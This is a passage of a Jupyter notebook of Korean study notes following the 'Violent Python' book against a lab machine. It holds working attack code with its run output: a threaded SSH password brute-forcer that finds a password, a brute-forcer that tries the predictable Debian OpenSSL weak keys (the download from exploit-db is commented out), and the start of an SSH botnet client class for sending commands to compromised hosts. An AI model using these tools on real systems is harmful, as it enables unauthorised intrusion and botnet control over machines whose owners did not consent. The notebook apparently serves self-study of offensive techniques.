      "    # \uc2dc\uac04\ucd08\uacfc\uac00 \ubc1c\uc0dd\ud558\uc9c0 \uc54a\uace0 shh_newkey \uba54\uc2dc\uc9c0\uac00 \ub728\uc9c0 \uc54a\uc558\uc73c\uba74 password\ub97c \ubcf4\ub0b8\ub2e4.\n",
      "    child.sendline(password)\n",
      "    child.expect(PROMPT)\n",
      "    return child\n",
      "\n",
      "def main():\n",
      "    host = '172.16.190.132'\n",
      "    user = 'violent'\n",
      "    password = 'violent'\n",
      "    child = connect(user, host, password)\n",
      "    send_command(child, 'ls')\n",
      "    send_command(child, 'pwd')\n",
      "\n",
      "if __name__ == '__main__':\n",
      "    main()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "There is 1 zombie process.\r\n",
        "\r\n",
        "  Graph this data and manage this system at https://landscape.canonical.com/\r\n",
        "\r\n",
        "The programs included with the Ubuntu system are free software;\r\n",
        "the exact distribution terms for each program are described in the\r\n",
        "individual files in /usr/share/doc/*/copyright.\r\n",
        "\r\n",
        "Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\r\n",
        "applicable law.\r\n",
        "\r\n",
        "Last login: Sat Jun 28 16:40:46 2014 from 172.16.190.1\r",
        "\r\n",
        "violent@bt:~\n",
        "ls\r\n",
        "index.html  wstool\r\n",
        "violent@bt:~"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n"
       ]
      }
     ],
     "prompt_number": 105
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### \ucf54\ub4dc indent \uc5c9\ub9dd\n",
      "\n",
      "- \ucc45\uacfc \ub2e4\uc6b4\ub85c\ub4dc \ubc1b\uc740 \uc18c\uc2a4\ucf54\ub4dc \ubaa8\ub450 indent\uac00 \uc5c9\ub9dd\uc774\ub77c\uc11c \ud574\uc11d\ud558\uae30\uac00 \uc5b4\ub824\uc6e0\ub2e4.\n",
      "- \ud30c\uc774\uc36c\uc5d0\uc11c indent\ub294 C\uc5b8\uc5b4\uc758 {}\uc640 \uac19\uc740 \uc5ed\ud560\uc744 \ud558\ub294 \uac83\uc778\ub370 \uc5c9\ub9dd\uc73c\ub85c \ub9cc\ub4e4\uba74 \uc774\ud574\ud558\uae30\uac00 \uc27d\uc9c0\uc54a\uace0 \ub17c\ub9ac\uc801\uc73c\ub85c \ub530\uc838\ubd10\uc57c \ud55c\ub2e4."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# -*- coding: utf-8\n",
      "import pxssh\n",
      "import optparse\n",
      "import time\n",
      "from threading import *\n",
      "\n",
      "maxConnections = 5\n",
      "# threaind \uc548\uc5d0 \ub4e4\uc5b4\uc788\ub294 BoundedSemaphore \ud568\uc218\n",
      "connection_lock = BoundedSemaphore(value=maxConnections)\n",
      "\n",
      "Found = False\n",
      "Fails = 0\n",
      "\n",
      "# connect \ud568\uc218\uc5d0 \uc778\uc790\uac12\uc73c\ub85c release \ud3ec\ud568\n",
      "def connect(host, user, password, release):\n",
      "    global Found\n",
      "    global Fails\n",
      "\n",
      "    try:\n",
      "        s = pxssh.pxssh()\n",
      "        s.login(host, user, password)\n",
      "        print '[+] Password Found: ' + password\n",
      "        Found = True\n",
      "    except Exception, e:\n",
      "        # SSH \uc11c\ubc84\uc5d0\uc11c \uc5f0\uacb0\uc758 \uc218\uac00 \ucd08\uacfc\ub418\uc5c8\ub2e4\uace0 \uac00\uc815\n",
      "        if 'read_nonblocking' in str(e):\n",
      "            Fails += 1\n",
      "            time.sleep(5)\n",
      "            connect(host, user, password, False)\n",
      "        # Pxssh \uac00 \ucee4\ub9e8\ub4dc \ud504\ub86c\ud504\ud2b8\ub97c \ud68d\ub4dd\ud558\ub294\ub370 \uc5b4\ub824\uc6c0\uc774 \uc788\uc744 \ub54c\ub294 1\ucd08 \ud6c4 \uc7ac\uc5f0\uacb0\n",
      "        elif 'synchronize with original prompt' in str(e):\n",
      "            time.sleep(1)\n",
      "            connect(host, user, password, False)\n",
      "    finally:\n",
      "        if release:\n",
      "            connection_lock.release()\n",
      "\n",
      "def main():\n",
      "    parser = optparse.OptionParser('usage %prog ' +\n",
      "    '-H <target host> -u <user> -F <password list>')\n",
      "    parser.add_option('-H', dest='tgtHost', type='string', \\\n",
      "                      help='specify target host')\n",
      "    parser.add_option('-F', dest='passwdFile', type='string', \\\n",
      "                      help='specify password file')\n",
      "    parser.add_option('-u', dest='user', type='string', \\\n",
      "                      help='specify the user')\n",
      "\n",
      "    (options, args) = parser.parse_args()\n",
      "    host = options.tgtHost\n",
      "    passwdFile = options.passwdFile\n",
      "    user = options.user\n",
      "\n",
      "    if host == None or \\\n",
      "        passwdFile == None or \\\n",
      "        user == None:\n",
      "\n",
      "        print parser.usage\n",
      "        exit(0)\n",
      "\n",
      "    f = open(passwdFile, 'r')\n",
      "    for line in f:\n",
      "        if Found:\n",
      "            print '[*] Exiting: Password Found'\n",
      "            exit(0)\n",
      "        if Fails > 5:\n",
      "            print '[!] Exiting: Too Many Socket Timeouts'\n",
      "            exit(0)\n",
      "\n",
      "        connection_lock.acquire()\n",
      "        password = line.strip('\\r').strip('\\n')\n",
      "        print '[-] Testing: ' + str(password)\n",
      "        t = Thread(target=connect, args=(host, user, password, True))\n",
      "        child = t.start()\n",
      "\n",
      "if __name__ == '__main__':\n",
      "    main()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Writing ch02/ssh_brute.py\n"
       ]
      }
     ],
     "prompt_number": 38
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "backtrack = '172.16.190.132'"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 106
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!python ch02/ssh_brute.py -H $backtrack -u violent -F ch02/pass.txt"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "[-] Testing: admin\r\n",
        "[-] Testing: root\r\n",
        "[-] Testing: toor\r\n",
        "[-] Testing: password\r\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "[-] Testing: violent\r\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "[+] Password Found: violent\r\n",
        "[-] Testing: password1\r\n",
        "[*] Exiting: Password Found\r\n"
       ]
      }
     ],
     "prompt_number": 108
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### \ucde8\uc57d\ud55c \uac1c\uc778\ud0a4\ub97c \ud1b5\ud55c SSH \uacf5\uaca9\ud558\uae30\n",
      "\n",
      "#### Using private key and public key connect to many server\n",
      "<img src=\"files/images/public_private_many.png\" />\n",
      "\n",
      "#### [Getting started with SSH security and configuration](http://www.ibm.com/developerworks/aix/library/au-sshsecurity/)\n",
      "<img src=\"files/images/SSH_public_private_key.gif\" />\n",
      "\n",
      "- SSH\ub294 \ud328\uc2a4\uc6cc\ub4dc\ub97c \ud1b5\ud574 \uc778\uc99d\uc744 \ud558\ub294 \uc218\ub2e8 \uc81c\uacf5\n",
      "- \ucd94\uac00\uc801\uc73c\ub85c \uacf5\uac1c\ud0a4 \uc554\ud638\ub85c \uc778\uc99d\uc744 \ud560 \uc218 \uc788\ub294 \uc218\ub2e8\ub3c4 \uc81c\uacf5\n",
      "- \uc774\ub7ec\ud55c \uc2dc\ub098\ub9ac\uc624\uc5d0\uc11c \uc11c\ubc84\ub294 \uacf5\uac1c\ud0a4\ub97c \uac00\uc9c0\uace0 \uc788\uc73c\uba70, \uc0ac\uc6a9\uc790\ub294 \uac1c\uc778\ud0a4\ub97c \uac00\uc9c0\uace0 \uc788\uc74c\n",
      "- RSA\ub098 DSA \uc54c\uace0\ub9ac\uc998\uc744 \uc0ac\uc6a9\ud558\uc5ec \uc11c\ubc84\ub294 SSH\uc5d0 \ub85c\uadf8\uc778\ud560 \ub54c \uc0ac\uc6a9\ud560 \uc218 \uc788\ub294 \ud0a4\ub4e4\uc744 \uc0dd\uc131\n",
      "- 1024 \ube44\ud2b8, 2048 \ube44\ud2b8, 4096\ube44\ud2b8 \ud0a4\ub97c \uc0dd\uc131\ud560 \uc218 \uc788\ub294 \ub2a5\ub825 \ub584\ubb38\uc5d0 \uc774\ub7ec\ud55c \uc778\uc99d \uacfc\uc815\uc740 \ucde8\uc57d\ud55c \ud328\uc2a4\uc6cc\ub4dc\uc640\ub294 \ub2e4\ub974\uac8c \ubb34\ucc28\ubcc4 \ub300\uc785 \uacf5\uaca9\uc73c\ub85c \uacf5\uaca9\ud558\uae30\uac00 \ub9e4\uc6b0 \ud798\ub4ec\n",
      "\n",
      "\n",
      "- \ud558\uc9c0\ub9cc 2006\ub144 \ub370\ube44\uc548 \ub9ac\ub205\uc2a4 \ubc30\ud3ec\ud310\uc5d0\uc11c \ub9e4\uc6b0 \ud765\ubbf8\ub85c\uc6b4 \uc0ac\uac74 \ubc1c\uc0dd\n",
      "- \ud55c \uac1c\ubc1c\uc790\uac00 \uc4f4 \uc790\ub3d9\ud654 \uc18c\ud504\ud2b8\uc6e8\uc5b4 \ubd84\uc11d \ud234\uc5d0\uc11c \ucc3e\uc740 \ucf54\ub4dc \ub77c\uc778\uc5d0 \ub300\ud55c \uc8fc\uc11d \ub54c\ubb38\n",
      "- \ud574\ub2f9 \ucf54\ub4dc \ub77c\uc778\uc740 SSH \ud0a4\ub97c \uc0dd\uc131\ud558\ub294\ub370 \ud544\uc694\ud55c \uc5d4\ud2b8\ub85c\ud53c\ub97c \ubcf4\uc7a5\n",
      "- \ud558\uc9c0\ub9cc \uc8fc\uc11d\uc744 \ucd94\uac00\ud558\uba74\uc11c \uac80\uc0c9\ud560 \uc218 \uc788\ub294 \ud0a4 \uc2a4\ud398\uc774\uc2a4 15\ube44\ud2b8 \uc5d4\ud2b8\ub85c\ud53c\ub97c \uc5c6\uc560 \ubc84\ub838\ub2e4.(Ahmad, 2008)\n",
      "- 15\ube44\ud2b8 \uc5d4\ud2b8\ub85c\ud53c\uac00 \uc81c\uc678\ub418\uc5b4 \uc2e4\uc81c \uc54c\uace0\ub9ac\uc998\uc5d0\uc11c \uc0ac\uc6a9\ud560 \uc218 \uc788\ub294 \ud0a4\ub294 32,767\uac1c \ubc16\uc5d0 \ub0a8\uc9c0 \uc54a\uac8c \ub410\ub2e4.\n",
      "- \ubb34\uc5b4\ub294 2\uc2dc\uac04 \ub9cc\uc5d0 1024\ube44\ud2b8\uc640 2048 \ube44\ud2b8 \ud0a4 \ubaa8\ub450\ub97c \uc0dd\uc131\ud558\ub294\ub370 \uc131\uacf5(Moore, 2008)\n",
      "- http://digitaloffense.net/tools/debianopenssl/ \uc5d0\uc11c \ud0a4\ub97c \ub2e4\uc6b4\ub85c\ub4dc \ud560 \uc218 \uc788\ub3c4\ub85d \uacf5\uac1c\n",
      "- \uc2dc\uc791\ud558\uae30 \uc704\ud574 \uba3c\uc800 1024 \ube44\ud2b8 \ud0a4\ub97c [\ub2e4\uc6b4\ub85c\ub4dc](http://www.exploit-db.com/sploits/debian_ssh_dsa_1024_x86.tar.bz2 )\ud55c\ub2e4. \ud0a4\ub97c \ub2e4\uc6b4\ub85c\ub4dc\ud558\uace0 \ucd94\ucd9c\ud55c \ud6c4, \uc774\ubc88 \ud14c\uc2a4\ud2b8\uc5d0\uc11c\ub294 \uac1c\uc778 \ud0a4\ub9cc \uc788\uc73c\uba74 \ub418\uae30 \ub54c\ubb38\uc5d0 \uacf5\uac1c \ud0a4\ub97c \uc0ad\uc81c"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# download debian_ssh_dsa_1024_x86\n",
      "# !curl -o ch02/debian_ssh_dsa_1024_x86.tar.bz2 http://www.exploit-db.com/sploits/debian_ssh_dsa_1024_x86.tar.bz2 "
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 1
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### \uacf5\uac1c\ud0a4 \uc0ad\uc81c\uc2dc rm -rf Argument list too long error\n",
      "\n",
      "> find . -maxdepth 1 -name \"*.txt\" -print0 | xargs -0 rm"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### SSH\uc5d0 \uc788\ub294 \ucde8\uc57d\uc810\uc73c\ub85c \ubb34\ucc28\ubcc4 \ub300\uc785 \uacf5\uaca9\n",
      "\n",
      "- http://www.exploit-db.com/exploits/5720/"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### SSH \uc778\uc790 \ud574\uc11d\n",
      "\n",
      "- ssh user@host -i keyfile -o PasswordAuthentication=no\n",
      "- ssh\ub85c \ub85c\uadf8\uc778\ud558\ub294\ub370 keyfile\uc744 \uc0ac\uc6a9\ud558\uace0 \ud328\uc2a4\uc6cc\ub4dc \uc778\uc99d\uc744 \uc0ac\uc6a9\ud558\uc9c0 \uc54a\uc744\uac70\uc57c.\n",
      "\n",
      "- -i identity_file\n",
      "         Selects a file from which the identity (private key) for public key\n",
      "         authentication is read.  The default is ~/.ssh/identity for protocol ver-\n",
      "         sion 1, and ~/.ssh/id_dsa, ~/.ssh/id_ecdsa and ~/.ssh/id_rsa for protocol\n",
      "         version 2.  Identity files may also be specified on a per-host basis in\n",
      "         the configuration file.  It is possible to have multiple -i options (and\n",
      "         multiple identities specified in configuration files).  ssh will also try\n",
      "         to load certificate information from the filename obtained by appending\n",
      "         -cert.pub to identity filenames.\n",
      "             \n",
      "- -o option\n",
      "         Can be used to give options in the format used in the configuration file.\n",
      "         This is useful for specifying options for which there is no separate com-\n",
      "         mand-line flag.  For full details of the options listed below, and their\n",
      "         possible values, see ssh_config(5)."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# -*- coding: utf-8\n",
      "import pexpect\n",
      "import optparse\n",
      "import os\n",
      "from threading import *\n",
      "\n",
      "maxConnections = 5\n",
      "# threaind \uc548\uc5d0 \ub4e4\uc5b4\uc788\ub294 BoundedSemaphore \ud568\uc218\n",
      "connection_lock = BoundedSemaphore(value=maxConnections)\n",
      "\n",
      "Stop = False\n",
      "Fails = 0\n",
      "\n",
      "# connect \ud568\uc218\uc5d0 \uc778\uc790\uac12\uc73c\ub85c release \ud3ec\ud568\n",
      "def connect(host, user, keyfile, release):\n",
      "    global Stop\n",
      "    global Fails\n",
      "\n",
      "    try:\n",
      "        perm_denied = 'Permission denied'\n",
      "        ssh_newkey = 'Are you sure you want to continue'\n",
      "        conn_closed = 'Connection closed by remote host'\n",
      "        opt = ' -o PasswordAuthentication=no'\n",
      "        connStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt\n",
      "        child = pexpect.spawn(connStr)\n",
      "        ret = child.expect([pexpect.TIMEOUT, perm_denied, \\\n",
      "                            ssh_newkey, conn_closed, '$', '#', ])\n",
      "\n",
      "        if ret == 2:\n",
      "            print '[-] Adding Host to ~/.ssh/known_hosts'\n",
      "            child.sendline('yes')\n",
      "            connect(user, host, keyfile, False)\n",
      "        elif ret == 3:\n",
      "            print '[-] Connection Closed By Remote Host'\n",
      "            Fails += 1\n",
      "        elif ret > 3:\n",
      "            print '[+] Success. ' + str(keyfile)\n",
      "            Stop = True\n",
      "    finally:\n",
      "        if release:\n",
      "            connection_lock.release()\n",
      "\n",
      "def main():\n",
      "    parser = optparse.OptionParser('usage%prog -H ' +\\\n",
      "        '<target host> -u <user> -d <directory>')\n",
      "    parser.add_option('-H', dest='tgtHost', type='string', \\\n",
      "                      help='specify target host')\n",
      "    parser.add_option('-d', dest='passDir', type='string', \\\n",
      "                      help='specify directory with keys')\n",
      "    parser.add_option('-u', dest='user', type='string', \\\n",
      "                      help='specify the user')\n",
      "\n",
      "    (options, args) = parser.parse_args()\n",
      "    host = options.tgtHost\n",
      "    passDir = options.passDir\n",
      "    user = options.user\n",
      "\n",
      "    if host == None or \\\n",
      "        passDir == None or \\\n",
      "        user == None:\n",
      "        print parser.usage\n",
      "        exit(0)\n",
      "    for filename in os.listdir(passDir):\n",
      "        if Stop:\n",
      "            print '[*] Exiting: Key Found.'\n",
      "            exit(0)\n",
      "        if Fails > 5:\n",
      "            print '[!] Exiting: ' +\\\n",
      "                'Too Many Connections Closed By Remote Host.'\n",
      "            print '[!] Adjust number of simultaneous threads.'\n",
      "            exit(0)\n",
      "\n",
      "        connection_lock.acquire()\n",
      "        fullpath = os.path.join(passDir, filename)\n",
      "        print '[-] Testing keyfile ' + str(fullpath)\n",
      "        t = Thread(target=connect, \\\n",
      "                   args=(user, host, fullpath, True))\n",
      "        child = t.start()\n",
      "\n",
      "if __name__ == '__main__':\n",
      "    main()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stderr",
       "text": [
        "Usage: usage-c -H <target host> -u <user> -d <directory>\n",
        "\n",
        "-c: error: no such option: -f\n"
       ]
      },
      {
       "ename": "SystemExit",
       "evalue": "2",
       "output_type": "pyerr",
       "traceback": [
        "An exception has occurred, use %tb to see the full traceback.\n",
        "\u001b[0;31mSystemExit\u001b[0m\u001b[0;31m:\u001b[0m 2\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stderr",
       "text": [
        "To exit: use 'exit', 'quit', or Ctrl-D.\n"
       ]
      }
     ],
     "prompt_number": 2
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### SSH \uac1c\uc778\ud0a4 \uc0bd\uc9c8\uae30 -> \uc548\ub428 "
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# -*- coding: utf-8\n",
      "import pexpect\n",
      "import optparse\n",
      "import os\n",
      "from threading import *\n",
      "\n",
      "maxConnections = 5\n",
      "# threaind \uc548\uc5d0 \ub4e4\uc5b4\uc788\ub294 BoundedSemaphore \ud568\uc218\n",
      "connection_lock = BoundedSemaphore(value=maxConnections)\n",
      "\n",
      "Stop = False\n",
      "Fails = 0\n",
      "PROMPT = ['#', '>>> ', '> ', '\\$ ']\n",
      "\n",
      "# connect \ud568\uc218\uc5d0 \uc778\uc790\uac12\uc73c\ub85c release \ud3ec\ud568\n",
      "def connect(user, host, keyfile, release):\n",
      "    global Stop\n",
      "    global Fails\n",
      "\n",
      "    try:\n",
      "        perm_denied = 'Permission denied'\n",
      "        ssh_newkey = 'Are you sure you want to continue'\n",
      "        conn_closed = 'Connection closed by remote host'\n",
      "        opt = ' -o PasswordAuthentication=no'\n",
      "        connStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt\n",
      "        child = pexpect.spawn(connStr)\n",
      "        ret = child.expect([pexpect.TIMEOUT, perm_denied, \\\n",
      "                            ssh_newkey, conn_closed, '#', '$', ])\n",
      "\n",
      "        if ret == 2:\n",
      "            print '[-] Adding Host to ~/.ssh/known_hosts'\n",
      "            child.sendline('yes')\n",
      "            connect(user, host, keyfile, False)\n",
      "        elif ret == 3:\n",
      "            print '[-] Connection Closed By Remote Host'\n",
      "            Fails += 1\n",
      "        elif ret > 3:\n",
      "            print '[+] Success. ' + str(keyfile)\n",
      "            Stop = True\n",
      "\n",
      "        # child.sendline('id')\n",
      "        # child.expect(PROMPT)\n",
      "        # print child.before\n",
      "\n",
      "    finally:\n",
      "        if release:\n",
      "            connection_lock.release()\n",
      "\n",
      "def send_command(child, cmd):\n",
      "    child.sendline(cmd)\n",
      "    child.expect(PROMPT)\n",
      "    print child.before\n",
      "\n",
      "def main():\n",
      "    parser = optparse.OptionParser('usage%prog -H ' +\\\n",
      "        '<target host> -u <user> -d <directory>')\n",
      "    parser.add_option('-H', dest='tgtHost', type='string', \\\n",
      "                      help='specify target host')\n",
      "    parser.add_option('-d', dest='passDir', type='string', \\\n",
      "                      help='specify directory with keys')\n",
      "    parser.add_option('-u', dest='user', type='string', \\\n",
      "                      help='specify the user')\n",
      "\n",
      "    (options, args) = parser.parse_args()\n",
      "    host = options.tgtHost\n",
      "    passDir = options.passDir\n",
      "    user = options.user\n",
      "\n",
      "    if host == None or \\\n",
      "        passDir == None or \\\n",
      "        user == None:\n",
      "        print parser.usage\n",
      "        exit(0)\n",
      "    for filename in os.listdir(passDir):\n",
      "        if Stop:\n",
      "            print '[*] Exiting: Key Found.'\n",
      "            exit(0)\n",
      "        if Fails > 5:\n",
      "            print '[!] Exiting: ' +\\\n",
      "                'Too Many Connections Closed By Remote Host.'\n",
      "            print '[!] Adjust number of simultaneous threads.'\n",
      "            exit(0)\n",
      "\n",
      "        connection_lock.acquire()\n",
      "        fullpath = os.path.join(passDir, filename)\n",
      "        print '[-] Testing keyfile ' + str(fullpath)\n",
      "        t = Thread(target=connect, \\\n",
      "                   args=(user, host, fullpath, True))\n",
      "        child = t.start()\n",
      "\n",
      "        # connect(user, host, fullpath, True)\n",
      "\n",
      "if __name__ == '__main__':\n",
      "    main()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stderr",
       "text": [
        "Usage: usage-c -H <target host> -u <user> -d <directory>\n",
        "\n",
        "-c: error: no such option: -f\n"
       ]
      },
      {
       "ename": "SystemExit",
       "evalue": "2",
       "output_type": "pyerr",
       "traceback": [
        "An exception has occurred, use %tb to see the full traceback.\n",
        "\u001b[0;31mSystemExit\u001b[0m\u001b[0;31m:\u001b[0m 2\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stderr",
       "text": [
        "To exit: use 'exit', 'quit', or Ctrl-D.\n"
       ]
      }
     ],
     "prompt_number": 3
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### SSH \ud65c\uc131\ud654 \ubc0f RSA \ud0a4\n",
      "\n",
      "- [Backtrack\uc5d0\uc11c SSH \ud65c\uc131\ud654 \ud558\uae30](http://tisiphone.tistory.com/182): \uc774\uac74 \uafc0\ud301\n",
      "- [\ub9ac\ub205\uc2a4 SSH RSA \ube44\ub300\uce6d\ud0a4\ub85c \ud328\uc2a4\uc6cc\ub4dc \uc5c6\uc774 \uc811\uc18d](http://snoopybox.co.kr/1734)\n",
      "- [RSA(\uacf5\uac1c\ud0a4) \uc554\ud638 \uc5f0\uc2b5](http://math88.com.ne.kr/crypto/rsa/2rsa-js.html): \uc2e4\uc81c \uc6f9\uc73c\ub85c \uacf5\uac1c\ud0a4\uac00 \uc5b4\ub5bb\uac8c \ud504\ub85c\uadf8\ub798\ubc0d \ub418\uc5b4 \uc788\ub294\uc9c0 \ud14c\uc2a4\ud2b8 \uac00\ub2a5\n",
      "- [RSA, DSA Key \uad50\ud658\uc73c\ub85c \ub85c\uadf8\uc778 \ud558\uae30](http://www.joinc.co.kr/modules/moniwiki/wiki.php/Site/Tip/auto_login): \uc81c\uc77c \uc798 \uc774\ud574\uac00 \ub41c\ub2e4.\n",
      "- [ssh-keygen Tutorial - Generating RSA and DSA keys](http://www.guyrutenberg.com/2007/10/05/ssh-keygen-tutorial-generating-rsa-and-dsa-keys/)\n",
      "- [Fixing \"Warning: UNPROTECTED PRIVATE KEY FILE!\" on LINUX](http://www.howtogeek.com/168119/fixing-warning-unprotected-private-key-file-on-linux/)\n",
      "\n",
      "\n",
      "- [Debian OpeenSSL Bug](http://trailofbits.files.wordpress.com/2008/07/hope-08-openssl.pdf)\n",
      "- [Ubuntu 7.04](http://old-releases.ubuntu.com/releases/7.04/)\n",
      "- [Ubuntu How to install SSH](http://ubuntuguide.org/wiki/Ubuntu:Feisty#How_to_install_SSH_Server_for_remote_administration_service)\n",
      "- [Backtrack\uc5d0\uc11c \uc2e4\uc218\ub85c SSH \uc9c0\uc6e0\uc744 \ub54c \ubcf5\uad6c \ubc29\ubc95](http://askubuntu.com/questions/347280/ubuntu-12-04-and-openssh-server)\n",
      "\n",
      "#### ssh known hosts \uc548\uc5d0 key\ub97c \uc800\uc7a5\ud574\ub193\uace0 \ud65c\uc6a9\n",
      "\n",
      "- \uc811\uc18d\uc774 \uc798 \uc548\ub418\uba74 \uc774 \ubd80\ubd84 \uc0ad\uc81c\ud558\uace0 \uc811\uc18d \uc2dc\ub3c4\n",
      "\n",
      "<img src=\"files/images/ssh_known_hosts.png\" />"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### SSH \ubd07\ub137 \uad6c\ucd95\ud558\uae30\n",
      "\n",
      "#### Botnet structure\n",
      "<img src=\"files/images/botnet2.gif\" />\n",
      "\n",
      "<img src=\"files/images/botnet1.jpg\" />\n",
      "\n",
      "- SSH\ub97c \ud1b5\ud574 \ud638\uc2a4\ud2b8\ub97c \uc81c\uc5b4\ud560 \uc218 \uc788\ub2e4\ub294 \uac83\uc744 \ubcf4\uc5ec\uc92c\uc73c\ub2c8 \uc5ec\ub7ec \ud638\uc2a4\ud2b8\ub97c \ub3d9\uc2dc\uc5d0 \uc81c\uc5b4\ud560 \uc218 \uc788\ub3c4\ub85d \uc2a4\ud06c\ub9bd\ud2b8\ub97c \ud655\uc7a5\n",
      "- \ubd07\ub137: \ud574\ud0b9\ud55c \ucef4\ud4e8\ud130 \uc5ec\ub7ec\ub300\ub97c \ub3d9\uc2dc\uc5d0 \uc545\uc758\uc801\uc778 \ubaa9\uc801\uc73c\ub85c \uc0ac\uc6a9\n",
      "- \ud074\ub798\uc2a4: \uac1d\uccb4\uc9c0\ud5a5 \ud504\ub85c\uadf8\ub7a8\uc774\ub77c\ub294 \ud504\ub85c\uadf8\ub798\ubc0d \ubaa8\ub378\uc758 \uadfc\ubcf8\uc801\uc778 \uc694\uc18c\n",
      "- \uac01\uac01\uc758 \uac1d\uccb4\ub97c \uad00\ub828\ub41c \uba54\uc18c\ub4dc\ub85c \uc2e4\uccb4\ud654\n",
      "- \uac01 \ubd07 \ub610\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8\uac00 \ub124\ud2b8\uc6cc\ud06c\uc5d0 \uc5f0\uacb0\ud558\uace0 \uba85\ub839\uc744 \uc804\uc1a1\ud558\ub294 \uae30\ub2a5 \ud544\uc694\n",
      "\n",
      "#### Class\n",
      "\n",
      "<img src=\"files/images/heredity.jpg\" />"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# -*- coding: utf-8\n",
      "import pexpect\n",
      "import pxssh\n",
      "\n",
      "class Client:\n",
      "    def __init__(self, host, user, password):\n",
      "        self.host = host\n",
      "        self.user = user\n",
      "        self.password = password\n",
      "        self.session = self.connect()\n",
      "\n",
      "    def connect(self):\n",
      "        try:\n",
      "            s = pxssh.pxssh()\n",
      "            s.login(self.host, self.user, self.password)\n",
      "            return s\n",
      "        except Exception, e:\n",
      "            print e\n",
      "            print '[-] Error Connecting'\n",
      "\n",
      "    def send_command(self, cmd):\n",
      "        self.session.sendline(cmd)\n",
      "        self.session.prompt()\n",
      "        return self.session.before"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 4
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "- \ud074\ub798\uc2a4 \uac1d\uccb4\uc778 Client()\ub97c \uc0dd\uc131\ud558\ub294 \ucf54\ub4dc\ub97c \uc0b4\ud3b4\ubd04\n",
      "- \ud074\ub77c\uc774\uc5b8\ud2b8\ub97c \uc0dd\uc131\ud558\uae30 \uc704\ud574\uc11c\ub294 \ud638\uc2a4\ud2b8 \uc0ac\uc6a9\uc790 \uc774\ub984, \uc544\uc774\ub514, \ud328\uc2a4\uc6cc\ub4dc \ub610\ub294 \ud0a4\uac00 \ud544\uc694\ud558\ub2e4.\n",
      "- \ud074\ub798\uc2a4\uc5d0\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8\ub97c \uc720\uc9c0\ud558\uae30 \uc704\ud574 \ud544\uc694\ud55c \uba54\uc18c\ub4dc\n",
      "- Connect(), send_command(), alive() \ub4f1\n",
      "- \ud074\ub798\uc2a4\uc5d0 \uc18d\ud558\ub294 \ubcc0\uc218\ub97c \uc0ac\uc6a9\ud560 \ub54c\uc640 self\uc640 \uadf8 \ub4a4\uc5d0 \ubcc0\uc218 \uc774\ub984\uc744 \ubd99\uc5ec\uc11c \ud638\ucd9c\ud558\ub294 \uac83\uc5d0 \uc720\uc758\n",
      "- \ubd07\ub137\uc744 \uad6c\ucd95\ud558\uae30 \uc704\ud574\uc11c\ub294 botnet \uc774\ub77c\ub294 \uad11\uc5ed \ubc30\uc5f4\uc744 \ub9cc\ub4e4\uace0 \uc774 \ubc30\uc5f4\uc5d0 \uac1c\uac1c\uc778\uc758 \ud074\ub77c\uc774\uc5b8\ud2b8 \uac1d\uccb4\ub97c \ud3ec\ud568\n",
      "- \ub2e4\uc74c\uc73c\ub85c, addClient() \ub77c\ub294 \ud568\uc218 \ub9cc\ub4ec\n",
      "- \uc774 \ud568\uc218\ub294 \ud638\uc2a4\ud2b8, \uc0ac\uc6a9\uc790 \uc774\ub984, \ud328\uc2a4\uc6cc\ub4dc\ub97c \uc785\ub825 \ubc1b\uc544\uc11c \ud074\ub77c\uc774\uc5b8\ud2b8 \uac1d\uccb4\ub97c \uc2e4\uccb4\ud654\ud558\uace0 \ubd07\ub137 \ubc30\uc5f4\uc5d0 \ucd94\uac00\n",
      "- botnetCommand() \ud568\uc218\ub294 \uba85\ub839\uc5b4\ub97c \uc785\ub825 \ubc1b\ub294\ub2e4.\n",
